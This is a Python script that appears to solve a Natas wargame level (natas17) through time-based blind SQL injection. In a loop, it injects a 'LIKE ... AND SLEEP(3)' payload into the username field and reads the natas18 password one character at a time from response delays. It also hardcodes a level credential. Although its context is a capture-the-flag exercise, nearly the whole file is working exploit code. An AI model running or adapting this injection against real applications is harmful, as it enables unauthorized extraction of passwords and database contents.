from time import *
import natasX

natas = natasX

w = ""

#print(natas.natasX(17, "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw", endpoint="index.php?debug=yes", data={"username": f'natas18" AND BINARY password LIKE "{w}%" AND SLEEP(2) #'}).text)

for i in range(1,70):

    for n in range(26):
        start = time()
        natas.natasX(
            17,
            "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw",
            endpoint="index.php?debug=yes",
            param={"username": f'natas18" AND BINARY password LIKE "{w}{chr(65 + n)}%" AND SLEEP(3) #'}
        )
        end = time()
        if end - start > 2.5:
            print(f'{w}{chr(65+n)}')
            w += chr(65+n)
            break

        start = time()
        natas.natasX(
            17,
            "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw",
            endpoint="index.php?debug=yes",
            param={"username": f'natas18" AND BINARY password LIKE "{w}{chr(97 + n)}%" AND SLEEP(3) #'}
        )
        end = time()
        if end - start > 2.5:
            print(f'{w}{chr(97+n)}')
            w += chr(97 + n)
            break

        for m in range(0, 10):
            start = time()
            natas.natasX(
                17,
                "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw",
                endpoint="index.php?debug=yes",
                param={"username": f'natas18" AND BINARY password LIKE "{w}{m}%" AND SLEEP(3) #'}
            )
            end = time()
            if end - start > 2.5:
                print(f'{w}{m}')
                w += f'{m}'
                break

    if len(w) < i:
        break
